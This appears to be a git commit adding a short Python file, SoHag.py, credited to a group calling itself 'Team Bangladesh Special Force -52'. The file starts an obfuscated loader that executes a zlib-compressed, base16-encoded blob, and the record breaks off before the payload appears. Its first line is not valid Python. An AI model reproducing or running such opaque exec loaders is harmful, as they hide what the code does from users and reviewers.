d592b5a3ba602b0df8635963bf5368467db86cbb
BangladeshSpecialForce52 <68007411+BangladeshSpecialForce52@users.noreply.github.com>
2020-07-16 21:00:52 +0600

    Create SoHag.py

---
+++ SoHag.py
@@ -0,0 +1,8 @@
+bsix v1.0
+# Contact Me On Facebook For Using This Tool
+# Coded By N S SoHag Chowdhury 
+# If You Wanna Take Credits For This Code, Please Look Yourself Again...
+# Reserved2020
+# Powered by Team Bangladesh Special Force -52
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b16decode
